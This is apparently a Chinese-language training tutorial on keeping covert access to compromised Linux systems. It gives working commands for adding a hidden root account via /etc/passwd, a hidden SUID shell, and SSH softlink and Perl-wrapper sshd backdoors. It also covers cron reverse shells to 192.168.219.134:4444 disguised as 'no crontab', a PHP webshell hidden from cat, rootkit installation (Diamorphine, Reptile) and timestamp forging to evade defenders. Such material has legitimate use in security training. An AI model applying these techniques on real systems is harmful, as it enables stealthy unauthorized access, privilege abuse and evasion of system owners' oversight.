[TOC]



# ==Linux权限维持==

教材内容

### 1、创建账户

##### 1.1 修改 /ect/passwd，创建拥有root权限的用户

当然，前提是我们必须得先拿到root权限或者拿到对 /etc/passwd 文件的写权限

我们知道 /etc/passwd 中每一行数据格式为：”用户名:口令:用户标识号:用户组标识号:描述:主目录:命令解释器”，于是我们可以添加一个用户名为test，密码为 `password@123`（加密后为advwtv/9yU5yQ），其他项与root用户一致。

```shell
echo "test:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash" >>/etc/passwd
```

![image-20220831155536566](https://gitee.com/ymq_typroa/typroa/raw/main/20220831155536.png)

如果提权成功，也可以直接创建一个uid=0并且gid=0的用户，或者将普通用户加入root组。

```shell
useradd -o -u 0 -g 0 hacker; 
passwd hacker; 
修改密码即可
```

##### 1.2 创建拥有sudo权限的账号

创建一个普通用户，而后在 /etc/sudoers 文件中为该普通用户添加sudo权限。

```shell
user1 ALL=(ALL) ALL                # 允许用户user1执行sudo命令(以root权限)，需要输入user1密码。
%users1 ALL=(ALL) ALL            # 允许用户组users1里面的用户执行sudo命令，需要输入对应用户密码。
user1 ALL=(ALL) NOPASSWD: ALL    # 允许用户user1执行sudo命令，且无需输入密码。
%users1 ALL=(ALL) NOPASSWD: ALL    # 允许用户组users1里面的用户执行sudo命令，且无需输入密码。
```

##### 1.3 普通用户+SUID shell

bash是众所周知的脚本解释器，bash文件里面也都是脚本内容(.sh)。复制这个脚本，并给予操作权限，这样我们普通用户也可以使用ROOT权限执行命令。

1. 创建一个普通用户。

2. 先切换成为root用户，并执行以下的命令。

   ```shell
    cp /bin/bash /bin/.shell        # 名为.开头的隐藏文件 
    chmod 4755 /bin/.shell             # 赋予可执行的权限与SUID权限
   ```

3. 切换为普通用户张三执行脚本。

   ```shell
    /bin/.shell -p  #bash2 针对 suid 有一些护卫的措施，需使用-p参数来获取一个root shell
   ```

   ![image-20220901174934760](https://gitee.com/ymq_typroa/typroa/raw/main/20220901174934.png)

#### 2、文件属性修改

##### 2.1 修改文件创建时间

可以使用touch命令修改时间和属性，防止防守方根据文件修改时间来判断文件是否为后门。

- 使用touch -r

  ```shell
  touch -r a.txt b.txt 
  # 将 b.txt 文件的修改时间和访问时间属性复制到 a.txt 文件中
  ```

![image-20220831143043749](https://gitee.com/ymq_typroa/typroa/raw/main/20220831143043.png)

- 使用touch -t ，按指定时间修改文件的修改时间与访问时间。

  ```shell
  touch -t 202208120800.00 b.txt 
  #修改b.txt文件的访问时间与修改时间为2022年8月12日8点00分00秒
  ```

  ![image-20220831145648271](https://gitee.com/ymq_typroa/typroa/raw/main/20220831145648.png)

  通过stat命令查看文件属性：

   Access：访问时间。

   Modify：修改时间，ls -l列出的时间就是这个时间。

   Change：改变时间，当文件权限与属性发生改变时更新，例如：通过chmod命令更改一次文件属性，这个时间就会更新。

改变时间（Change）只能通过修改系统时间来自定义，我们可以先将系统时间修改至需要的时间点，创建好文件后再将时间更新。

##### 2.2 创建隐藏文件

在文件名与目录名前加.即可创建隐藏文件或目录，但可以通过ls 的 -a 参数查看到。

```shell
touch .shell.php    # 创建名为 .shell.php文件
touch ...            # 创建名为 … 的文件
mkdir ...            # 创建名为 … 的目录
```

![image-20220831151448262](https://gitee.com/ymq_typroa/typroa/raw/main/20220831151448.png)

##### 2.3 文件上锁，防止用户直接删除文件

Linux 系统中的文件和目录，除了可以设定普通权限和特殊权限外，还可以利用文件和目录具有的一些隐藏属性。而chattr 命令，专门用来修改文件或目录的隐藏属性，只有 root 用户可以使用。

chattr [+-=] [属性] 文件或目录名

| 属性选项 | 功能                                                         |
| :------- | :----------------------------------------------------------- |
| i        | 如果对文件设置 i 属性，那么不允许对文件进行删除、改名，也不能添加和修改数据； 如果对目录设置 i 属性，那么只能修改目录下文件中的数据，但不允许建立和删除文件； |
| a        | 如果对文件设置 a 属性，那么只能在文件中増加数据，但是不能删除和修改数据； 如果对目录设置 a 属性，那么只允许在目录中建立和修改文件，但是不允许删除文件； |
| u        | 设置此属性的文件或目录，在删除时，其内容会被保存，以保证后期能够恢复，常用来防止意外删除文件或目录。 |
| s        | 和 u 相反，删除文件或目录时，会被彻底删除（直接从硬盘上删除，然后用 0 填充所占用的区域），不可恢复。 |

示例：为test.txt文件添加i属性，而后尝试删除该文件，提示无法删除。

![image-20220831174727425](https://gitee.com/ymq_typroa/typroa/raw/main/20220831174727.png)

使用lsattr可以查看文件的隐藏属性。

![image-20220831175012384](https://gitee.com/ymq_typroa/typroa/raw/main/20220831175012.png)

#### 3、SSH后门

##### 3.1 软链接后门

建立一个软连接，然后通过5555端口访问ssh服务

```shell
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
```

![image-20220831170043816](https://gitee.com/ymq_typroa/typroa/raw/main/20220831170043.png)

直接对sshd建立软连接，之后用任意密码登录即可。可以通过netstat命令查看对应端口，来找到对应进程。

![image-20220831170356677](https://gitee.com/ymq_typroa/typroa/raw/main/20220831170356.png)

##### 3.2 SSH隐身登录

隐身登录系统，不会被last who w等指令检测到。

```shell
ssh -T username@host /bin/bash -i
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -if
```

如下，我们使用种方式进行登录，使用w命令查看到只有一个本地登录（tty1）的用户，没有出现该远程登录（pts）的用户记录。

![image-20220901103317764](https://gitee.com/ymq_typroa/typroa/raw/main/20220901103317.png)

##### 3.3 上传公钥，ssh免密登录

此处演示的客户端为Windows（192.168.219.219.216），服务器端（192.168.219.226）。

1. 客户端生成对应的公钥与私钥。

   ```shell
    ssh-keygen -t rsa
   ```

   ![image-20220901151015629](https://gitee.com/ymq_typroa/typroa/raw/main/20220901151015.png)

   生成的密钥默认存放于对应的用户目录下的.ssh文件夹下，如此处的C:\Users\Administrator/.ssh。

   ![image-20220901151412003](https://gitee.com/ymq_typroa/typroa/raw/main/20220901151412.png)

2. 在服务器端的/root下创建一个.ssh目录，上传公钥至此目录下，并修改文件名为authorized_keys。上传文件有许多方式，要根据实际情况决定，这里不做过多赘述。

   ```shell
    用户端使用scp上传：
    scp id_rsa.pub root@192.168.219.226:/root/.ssh 
    
    服务器端修改文件名：
    mv id_rsa.pub authorized_keys
   ```

3. 检查服务器端的ssh配置（/etc/ssh/sshd_config），默认是允许使用公钥登录，无需任何设置。若无法进行ssh免密登录，可以检查以下项：

   ```shell
    PermitRootLogin yes                             # 允许root用户远程登录 
    
    PubkeyAuthentication yes                        # 允许公钥验证 
    
    AuthorizedKeysFile      .ssh/authorized_keys       # 指定公钥文件
   ```

4. 客户端使用ssh直接登录。

   ![image-20220901154421777](https://gitee.com/ymq_typroa/typroa/raw/main/20220901154421.png)

##### 3.4 ssh warpper后门

1. 该后门需要安装perl，使用命令“ yum install perl -y ”进行安装即可

2. 构造一个恶意的sshd，具体操作如下：

   ```shell
    cd /usr/sbin/ 
    mv sshd ../bin/ 
    
    echo '#!/usr/bin/perl' >sshd 
    echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd 
    echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd 
    
    chmod u+x sshd 
    systemctl restart sshd   # 重启sshd服务
   ```

   原理：首先启动的是/usr/sbin/sshd,执行到getpeername时，正则匹配会失败，接着执行下一句，启动/usr/bin/sshd（原始sshd）。原sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作，而后子进程又会执行系统默认的位置的/usr/sbin/sshd。此时子进程标准输入输出已被重定向到套接字，若getpeername能真的获取到客户端的TCP源端口且为13377（4A是13377的小端模式），就反回一个shell。

3. 在kali上使用socat进行连接，指定源端口为13377。

   成功连接，使用w命令看到不到kali在连接此机器，。

   ![image-20220901164700751](https://gitee.com/ymq_typroa/typroa/raw/main/20220901164700.png)

   而是用netstat查看网络连接，就可以发现kali在通过自己的13377端口进行ssh连接。

![image-20220901165426072](https://gitee.com/ymq_typroa/typroa/raw/main/20220901165426.png)

这种后门方式隐蔽性较强，在没有连接的情况下，无法查看到对应的端口和进程，w、last等命令也查不到登录的情况，但是需要重启sshd服务。

> 使用knockd程序对22号端口进行特殊处理，防止直接使用：https://blog.csdn.net/weixin_51339377/article/details/128459954

#### 4、Crontab定时任务后门

 crontab是一个命令，常见于Unix和类Unix的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。

我们可以用以下命令，查看定时任务，并创建一个让Linux主机每过60秒让其执行反弹shell命令的任务。

```shell
(crontab -l;echo "*/1 * * * * /bin/bash -c '/bin/sh -i >& /dev/tcp/192.168.219.134/4444 0>&1';")|crontab -
```

但是使用这种方式使用crontab -l还是能够发现这一项定时任务。

![image-20220901111800625](https://gitee.com/ymq_typroa/typroa/raw/main/20220901111800.png)

可以使用以下命令进行利用，这是利用cat隐藏将一部分内容隐藏起来（cat打开文件时才有效果），再添加no crontab for whoami ，让用户以为没有定时任务。

```shell
(printf "*/60 * * * * /bin/bash -c '/bin/sh -i >& /dev/tcp/192.168.219.134/4444 0>&1';\rno crontab for `whoami`%100c\n")|crontab -
```

![image-20220901114921346](https://gitee.com/ymq_typroa/typroa/raw/main/20220901114921.png)

原理：cat打开文件时遇到一些特殊符号，比如 \r 回车符 \n 换行符 \f 换页符等，输出内容换页换行导致隐藏前面的部分内容。

但是使用 `crontab -A` 还是可以看见

#### 5、自启动脚本

在Linux中，哪些脚本可以实现自启动：

```shell
/etc/rc.d/rc.local：系统在启动时进行加载执行，/etc/rc.local是本文件的软链接文件。

/etc/profile: 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。

/etc/bashrc:  为每一个运行bash shell的用户执行此文件.当bash shell被打开时,该文件被读取。

~/.bash_profile: 每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次。

~/.bashrc: 该文件包含专用于你用户的bash shell的bash信息,当登录时以及每次打开新的shell时,该该文件被读取。

~/.bash_logout: 当每次退出系统(退出bash shell)时,执行该文件.

上述脚本的执行前提：必须拥有可执行权限或在特定的条件下触发执行。
```

在上述文件中，执行任意提权命令，植入木马命令，隐藏操作等，那么在系统启动或登录时便可以运行。

#### 6、隐藏进程

在实际的攻防中需要借助工具来维持权限和隐藏痕迹。而RootKit就是这类工具的总称，旨在隐藏其存在和活动，同时维持对受感染系统的持久性访问。通常用于攻击者获取未授权的访问权限，以执行恶意操作或窃取敏感信息。

##### 1、diamorphine

安装（https://github.com/m0nad/Diamorphine）

```
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make # （编译报错：试着安装 yum install kernel-devel）

# 以root权限加载模块：
insmod diamorphine.ko

# 卸载diamorphine模块
rmmod diamorphine
```

使用

```
# 获取root权限
kill -64 0

# 隐藏进程
kill -31 [pid] 

# 隐藏模块 （lsmod 列出模块）
kill -63 [pid] 

# 指定某用户的pid进程号，使该用户变成root，不可逆
kill -64 [pid] 

# 默认lsmod找不到diamorphine模块，执行这条就可以看到
kill -63 0   

# 以diamorphine_secret开的文件或文件夹都会隐藏
diamorphine_secret*
```

![image-20230707114854042](https://gitee.com/ymq_typroa/typroa/raw/main/202401082114844.png)

这款工具不能隐藏网络连接

##### 2、Reptile

安装（https://github.com/f0rb1dd3n/Reptile/archive/refs/tags/2.0.zip）

```
wget https://github.com/f0rb1dd3n/Reptile/archive/refs/tags/2.0.zip

./setup install
```

![image-20230707141903897](https://gitee.com/ymq_typroa/typroa/raw/main/202401082114877.png)

使用

```
/reptile/reptile_cmd root # 获取root权限

/reptile/reptile_cmd hide <pid> # 隐藏进程

/reptile/reptile_cmd show <pid> # 显示进程

/reptile/reptile_cmd udp <IP> <port> hide # 隐藏udp

/reptile/reptile_cmd udp <IP> <port> show # 显示udp

/reptile/reptile_cmd tcp <IP> <port> hide # 隐藏tcp

/reptile/reptile_cmd tcp <IP> <port> show # 显示tcp

reptile # 名字中包含此字段的文件或文件夹将会被隐藏
#<reptile> 
... 
#</reptile> 
文件中标签之间的内容将会被隐藏
```

![image-20230707143214379](https://gitee.com/ymq_typroa/typroa/raw/main/202401082114853.png)

#### 7、其他方式

##### 7.1 cat隐藏

cat默认支持一些特殊符号，如 \r 回车符 \n 换行符 \f 换页符等，但这些符号导致cat查看文件内容时会隐藏部分内容。不过我们可以通过“cat -A”来查看全部内容。

以下使用\r来隐藏PHP一句话木马：

```shell
echo -e "<?=\`\$_POST[a]\`?>\r<? hello word?>" > shell.php
```

![image-20220831163014247](https://gitee.com/ymq_typroa/typroa/raw/main/20220831163014.png)

echo命令的-e参数会开启转义，\r为换行，使用vi查看原文发现有一个特殊字符，这使得cat命令直接打开该文件时，会在此处换行，最终只显示换行符后的内容。

![image-20220831163528949](https://gitee.com/ymq_typroa/typroa/raw/main/20220831163528.png)

##### 7.2 将恶意程序配置为服务

将应用程序配置为服务后，也可以达到自启动目的，参考链接：

https://zhuanlan.zhihu.com/p/450710981

https://devpress.csdn.net/linux/62ed0ec119c509286f417e21.html

##### 7.3 利用nohup让程序在后台静默执行

```shell
nohup 恶意程序或命令 &
```